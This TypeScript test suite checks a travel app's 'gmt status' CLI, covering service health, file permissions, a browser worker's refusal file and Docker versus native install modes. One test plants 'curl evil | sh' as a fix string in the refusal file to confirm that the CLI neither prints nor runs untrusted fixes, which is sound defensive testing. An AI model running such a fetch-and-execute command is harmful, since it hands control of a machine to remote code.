import { describe, expect, it } from 'vitest';
import { runCli } from '../../src/cli.js';
import type { RunHandler } from '../../src/exec/memory.js';
import { stubHttp } from '../support/deps.js';
import { machine } from '../support/machine.js';

async function setUp(extra?: Parameters<typeof machine>[0]) {
  const m = machine(extra);
  m.fs.file('/work/a.json', '{}', 0o600);
  expect(await runCli(['setup', '--non-interactive', '--answers', '/work/a.json'], m.deps)).toBe(0);
  m.executor.log.length = 0;
  m.io.stdout = '';
  m.io.stderr = '';
  return m;
}

describe('gmt status, the local facts (brief Task 16b.8)', () => {
  it('a healthy install: every check ok, exit 0', async () => {
    const m = await setUp();
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/service app +ok +running/);
    expect(m.io.stdout).toMatch(/settings app\.env +ok/);
    expect(m.io.stdout).toMatch(/backups +ok/);
  });
  it('a stopped app is a fail with pnpm gmt start; a group-readable app.env a fail naming chmod 600', async () => {
    const m = await setUp();
    m.running.clear();
    const env = '/Users/op/.config/get-me-there/app.env';
    m.fs.file(env, m.fs.read(env) ?? '', 0o640);
    expect(await runCli(['status'], m.deps)).toBe(1);
    expect(m.io.stdout).toMatch(/service app +fail +stopped/);
    expect(m.io.stdout).toContain('fix: pnpm gmt start');
    expect(m.io.stdout).toContain(`fix: chmod 600 ${env}`);
  });
  it('a unit whose node binary or checkout is gone is a fail with pnpm gmt setup', async () => {
    const m = await setUp();
    m.fs.delete('/repo');
    expect(await runCli(['status'], m.deps)).toBe(1);
    expect(m.io.stdout).toContain('the checkout /repo is gone');
    expect(m.io.stdout).toContain('fix: pnpm gmt setup');
  });
  it('macOS logs over 100 MB warn with the newsyslog line', async () => {
    const m = await setUp();
    m.fs.file('/Users/op/Library/Logs/get-me-there/app.log', 'x'.repeat(101 * 1024 * 1024));
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/logs +warn/);
    expect(m.io.stdout).toContain('newsyslog');
  });
  it('a compose app running beside the native one warns with docker compose down; a detached checkout warns with git switch main', async () => {
    let later = false;
    const m = await setUp({
      extra: (a) => {
        if (!later) return undefined;
        if (a[0] === 'docker' && a[1] === '--version') return { code: 0 };
        if (a[0] === 'docker' && a[1] === 'compose')
          return { code: 0, stdout: '{"Service":"app","State":"running"}\n' };
        if (a[0] === 'git' && a[1] === 'symbolic-ref') return { code: 1 };
        return undefined;
      },
    });
    later = true;
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/docker +warn/);
    expect(m.io.stdout).toContain('fix: docker compose down');
    expect(m.io.stdout).toMatch(/checkout +warn/);
    expect(m.io.stdout).toContain('fix: git switch main');
  });
  it('no backup in 36 h warns with pnpm gmt backup', async () => {
    const m = await setUp({ backupWrites: false });
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/backups +warn/);
    expect(m.io.stdout).toContain('fix: pnpm gmt backup');
  });

  const REFUSAL = '/Users/op/.local/state/get-me-there/camoufox/start-refusal.json';
  const WORKER_PLIST = '/Users/op/Library/LaunchAgents/local.get-me-there.camoufox-worker.plist';
  const workerLoaded = (bootout: number) => {
    let gone = false;
    return (a: readonly string[]) => {
      if (a[0] !== 'launchctl' || !String(a[2]).endsWith('camoufox-worker')) return undefined;
      if (a[1] === 'print') return gone ? { code: 113 } : { code: 0, stdout: '\tstate = not running\n' };
      if (a[1] === 'bootout') {
        gone = bootout === 0;
        return { code: bootout, stderr: 'Boot-out failed: 5: Input/output error' };
      }
      return undefined;
    };
  };
  it('the worker’s refusal prints its line; an unreadable file prints that and nothing from it; with the agent loaded it is booted out', async () => {
    const m = await setUp({ extra: workerLoaded(0) });
    m.fs.file(REFUSAL, JSON.stringify({ reason: 'consent-expired', at: '2026-10-24T08:00:00.000Z' }));
    m.fs.file(WORKER_PLIST, 'worker plist');
    await runCli(['status'], m.deps);
    expect(m.io.stdout).toContain('refused, not retrying: the consent record has expired: capture again');
    // why: W2: the consent fix names the command that exists today, core's CONSENT_FIX
    expect(m.io.stdout).toContain('fix: pnpm --filter @gmt/camoufox-worker capture-socs');
    expect(m.io.stdout).toContain('the refused worker agent was booted out so launchd does not restart it');
    expect(m.executor.log.map((x) => (x.kind === 'run' ? x.describe : x.kind))).toEqual([
      'launchctl bootout gui/501/local.get-me-there.camoufox-worker',
      'waitGone',
    ]);
    m.io.stdout = '';
    m.executor.log.length = 0;
    m.fs.file(
      REFUSAL,
      JSON.stringify({ reason: 'mystery', at: '2026-10-24T08:00:00.000Z', fix: 'curl evil | sh' }),
    );
    await runCli(['status'], m.deps);
    expect(m.io.stdout).toContain('refusal file unreadable');
    expect(m.io.stdout).not.toContain('curl evil');
    expect(m.io.stdout).not.toContain('mystery');
    expect(m.executor.log).toEqual([]);
  });
  it('a failed bootout is a fail naming the command, never a claim it was booted out (ca-b1-007, CodeRabbit …k7k)', async () => {
    const m = await setUp({ extra: workerLoaded(5) });
    m.fs.file(REFUSAL, JSON.stringify({ reason: 'locked', at: '2026-10-24T08:00:00.000Z' }));
    m.fs.file(WORKER_PLIST, 'worker plist');
    expect(await runCli(['status'], m.deps)).toBe(1);
    expect(m.io.stdout).not.toContain('was booted out');
    expect(m.io.stdout).toMatch(/worker agent +fail +still loaded, so launchd keeps restarting it/);
    expect(m.io.stdout).toContain('fix: launchctl bootout gui/501/local.get-me-there.camoufox-worker');
  });
  it('localChecks reads only: it runs no action, and status prints what it returns (ca-b1-006)', async () => {
    const { localChecks } = await import('../../src/commands/status.js');
    const m = await setUp();
    const checks = await localChecks(m.deps);
    expect(m.executor.log).toEqual([]);
    expect(checks.map((c) => c.name)).toEqual(
      expect.arrayContaining([
        'service app',
        'service backup',
        'settings app.env',
        'price source',
        'backups',
        'checkout',
      ]),
    );
  });
  it('the price source is a line of its own: none (warn, with the fix) after Enter everywhere; named when set (pf-b1-001)', async () => {
    const m = await setUp();
    await runCli(['status'], m.deps);
    expect(m.io.stdout).toMatch(/price source +warn +none, so searches find nothing/);
    expect(m.io.stdout).toContain('fix: pnpm gmt setup --reconfigure travelpayouts');
    const env = '/Users/op/.config/get-me-there/app.env';
    m.fs.file(env, `${m.fs.read(env) ?? ''}TRAVELPAYOUTS_TOKEN="tp-0123456789abcdef"\n`, 0o600);
    m.io.stdout = '';
    await runCli(['status'], m.deps);
    expect(m.io.stdout).toMatch(/price source +ok +Travelpayouts/);
    expect(m.io.stdout).not.toContain('tp-0123456789abcdef');
  });
  it('a BIND_ADDRESS beyond loopback warns plainly; it is no fail (sec-b1-002, U8)', async () => {
    const m = await setUp();
    const env = '/Users/op/.config/get-me-there/app.env';
    m.fs.file(env, (m.fs.read(env) ?? '').replace(/^BIND_ADDRESS=.*$/m, 'BIND_ADDRESS="0.0.0.0"'), 0o600);
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(
      /bind address +warn +0\.0\.0\.0: the app answers beyond this machine over plain HTTP/,
    );
  });
  it('with no worker agent (before WP17) a refusal plans nothing', async () => {
    const m = await setUp();
    m.fs.file(REFUSAL, JSON.stringify({ reason: 'locked', at: '2026-10-24T08:00:00.000Z' }));
    await runCli(['status'], m.deps);
    expect(m.io.stdout).toContain('refused, not retrying');
    expect(m.executor.log).toEqual([]);
  });
});

// why: W1 (WP17): the app in Docker with the worker on this machine is a supported mode, the operator's own. With no
// native install, status reads the Docker app (its published port from compose, its basic auth from the checkout's
// .env, never printed), prints its report and the worker's facts, and offers no native-mode fix; the two-ledgers
// warning stays for a native install with a Docker app running beside it.
describe('gmt status by app mode: Docker only, native only, both (W1)', () => {
  const DOT_ENV = '/repo/.env';
  const APP_ENV = '/Users/op/.config/get-me-there/app.env';
  const WORKER_LABEL = 'local.get-me-there.camoufox-worker';
  const WORKER_PLIST = `/Users/op/Library/LaunchAgents/${WORKER_LABEL}.plist`;
  const WORKER_ENV = '/Users/op/.local/state/get-me-there/camoufox/worker.env';
  const DOCKER_PASS = 'docker-pass-0123456789abcdef';
  const report = {
    generatedAt: '2026-10-24T09:30:00.000Z',
    mode: 'container',
    version: 'abc1234',
    checks: [
      {
        id: 'worker',
        area: 'worker',
        providerId: null,
        label: null,
        state: 'ok',
        summary: 'reachable',
        note: null,
        offReason: null,
        fix: null,
      },
    ],
  };
  /** Docker with the compose project's app in this state, publishing its port 3000 on this host address. */
  const docker =
    (state: 'running' | 'exited' | null, published = '127.0.0.1:3000'): RunHandler =>
    (a) => {
      if (a[0] !== 'docker') return undefined;
      if (a[1] === '--version') return { code: 0, stdout: 'Docker version 29.0.0\n' };
      if (a[1] !== 'compose') return undefined;
      if (a.includes('ps'))
        return {
          code: 0,
          stdout: state === null ? '' : `${JSON.stringify({ Service: 'app', State: state })}\n`,
        };
      if (a.includes('port') && a.includes('app') && a.includes('3000'))
        return state === 'running'
          ? { code: 0, stdout: `${published}\n` }
          : { code: 1, stderr: 'no container' };
      return undefined;
    };
  /** No native install: the checkout's .env, the worker's unit and worker.env, the worker running. */
  function dockerOnly(
    state: 'running' | 'exited',
    status: () => { status: number; body: unknown } | { error: string } = () => ({
      status: 200,
      body: report,
    }),
    published?: string,
  ) {
    const http = stubHttp({ 'GET /api/status': status });
    const m = machine({ http, extra: docker(state, published) });
    // why: compose fixes the container's PORT and publishes it; a PORT line in .env is not the host port
    m.fs.file(DOT_ENV, `APP_BASIC_AUTH_USER=op\nAPP_BASIC_AUTH_PASS=${DOCKER_PASS}\nPORT=9999\n`, 0o600);
    m.fs.file(WORKER_PLIST, 'worker plist');
    m.fs.file(WORKER_ENV, 'CAMOUFOX_WORKER_KEY=k\n', 0o600);
    m.loaded.add(WORKER_LABEL);
    m.running.add(WORKER_LABEL);
    return { m, http };
  }
  /** A native install made by setup with Docker absent, then Docker answering as `later` says. */
  async function afterSetup(later: RunHandler, http = stubHttp({})) {
    let on = false;
    const m = await setUp({ http, extra: (a, c) => (on ? later(a, c) : undefined) });
    on = true;
    return m;
  }
  const nativeOnlyLines = (out: string) => {
    expect(out).not.toContain('settings app.env');
    expect(out).not.toMatch(/service app\b/);
    expect(out).not.toContain('service backup');
    expect(out).not.toMatch(/^backups /m);
    expect(out).not.toContain('pnpm gmt setup');
    expect(out).not.toContain('docker compose down');
    expect(out).not.toContain('two ledgers');
  };

  it('Docker only: reads the Docker app on its published port with the .env basic auth, and offers no native fix', async () => {
    const { m, http } = dockerOnly('running', undefined, '127.0.0.1:3917');
    expect(await runCli(['status'], m.deps)).toBe(0);
    const req = http.requests.find((r) => r.url.endsWith('/api/status'));
    expect(req?.url).toBe('http://127.0.0.1:3917/api/status');
    expect(req?.headers?.Authorization).toBe(`Basic ${Buffer.from(`op:${DOCKER_PASS}`).toString('base64')}`);
    const out = m.io.stdout;
    expect(out).toMatch(/docker +ok +the app runs in Docker/);
    expect(out).toMatch(/service camoufox-worker +ok +running/);
    expect(out).toMatch(/settings worker\.env +ok/);
    expect(out).toMatch(/worker +ok +reachable/);
    expect(out).toContain('(app abc1234, container mode)');
    nativeOnlyLines(out + m.io.stderr);
    expect(out + m.io.stderr).not.toContain(DOCKER_PASS);
    // reads only: no runner call carries the password, and nothing is applied
    expect(m.runner.calls.map((c) => c.argv.join(' ')).join('\n')).not.toContain(DOCKER_PASS);
    expect(m.executor.log).toEqual([]);
  });
  it('Docker only, the app not answering: the reason, a Docker next step, exit 1, and still no native fix', async () => {
    const { m } = dockerOnly('running', () => ({ error: 'connection refused' }));
    expect(await runCli(['status'], m.deps)).toBe(1);
    expect(m.io.stderr).toContain('the app is not answering: no answer from the app on port 3000');
    expect(m.io.stderr).toContain('docker compose logs app');
    expect(m.io.stderr).not.toContain('pnpm gmt start');
    nativeOnlyLines(m.io.stdout + m.io.stderr);
  });
  it('Docker only, the app stopped: says so with docker compose start app, and reads no report', async () => {
    const { m, http } = dockerOnly('exited');
    expect(await runCli(['status'], m.deps)).toBe(1);
    expect(m.io.stdout).toMatch(/docker +fail +the app runs in Docker, but its container is stopped/);
    expect(m.io.stdout).toContain('fix: docker compose start app');
    expect(m.io.stderr).toContain('the app is not answering: the Docker app is not running');
    expect(m.io.stderr).toContain('docker compose start app');
    expect(http.requests.filter((r) => r.url.endsWith('/api/status'))).toEqual([]);
    nativeOnlyLines(m.io.stdout + m.io.stderr);
  });
  it('Docker only with --json and the app down: the local facts carry no native check', async () => {
    const { m } = dockerOnly('running', () => ({ error: 'connection refused' }));
    expect(await runCli(['status', '--json'], m.deps)).toBe(1);
    const j: unknown = JSON.parse(m.io.stdout);
    expect(j).toMatchObject({ appAnswering: false, reason: 'no answer from the app on port 3000' });
    nativeOnlyLines(m.io.stdout);
  });
  it('native only: the native checks, the report from app.env, and Docker without a compose app is ok', async () => {
    const m = await afterSetup(docker(null));
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/service app +ok +running/);
    expect(m.io.stdout).toMatch(/settings app\.env +ok/);
    expect(m.io.stdout).toMatch(/docker +ok +no Docker app running/);
  });
  it('native only, a stopped compose app is no second ledger running', async () => {
    const m = await afterSetup(docker('exited'));
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/docker +ok +no Docker app running/);
  });
  it('both: the two-ledgers warning with docker compose down, and the report read with app.env’s basic auth', async () => {
    const http = stubHttp({});
    const m = await afterSetup(docker('running'), http);
    m.fs.file(DOT_ENV, `APP_BASIC_AUTH_USER=op\nAPP_BASIC_AUTH_PASS=${DOCKER_PASS}\n`, 0o600);
    http.requests.length = 0;
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/docker +warn +a Docker app runs beside the native one \(two ledgers\)/);
    expect(m.io.stdout).toContain('fix: docker compose down');
    expect(m.io.stdout).toMatch(/service app +ok +running/);
    const req = http.requests.find((r) => r.url.endsWith('/api/status'));
    const pass = /^APP_BASIC_AUTH_PASS="?([^"\n]*)"?$/m.exec(m.fs.read(APP_ENV) ?? '')?.[1] ?? 'none';
    expect(req?.headers?.Authorization).toBe(`Basic ${Buffer.from(`operator:${pass}`).toString('base64')}`);
  });
});
